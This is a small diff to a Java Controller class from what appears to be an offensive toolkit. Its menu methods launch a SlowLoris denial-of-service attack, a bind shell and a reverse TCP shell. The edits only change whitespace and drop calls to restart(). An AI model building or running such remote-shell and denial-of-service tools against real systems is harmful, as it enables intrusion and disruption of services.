@@ -289,7 +289,7 @@ public class Controller {
 		}
 		
 	}
-
+ 
 	public static void SlowLoris() {
 		System.out.println("Please input the website/host");
 		String host = inputScanner.nextLine();
@@ -633,7 +633,7 @@ public class Controller {
 		List<String> listOfArgs = new ArrayList<String>();
 		listOfArgs.add(port);
 		BindShell.main(listOfArgs.toArray(new String[listOfArgs.size()]));
-		controller.Controller.restart();
+		
 	}
 	public static void CreateReverseTCPConnection() {
 		System.out.println("Please input the IP address of listening device: ");
@@ -645,7 +645,7 @@ public class Controller {
 		listOfArgs.add(ip);
 		listOfArgs.add(port);
 		ReverseShell.main(listOfArgs.toArray(new String[listOfArgs.size()]));
-		controller.Controller.restart();
+		
 	}
 	
 
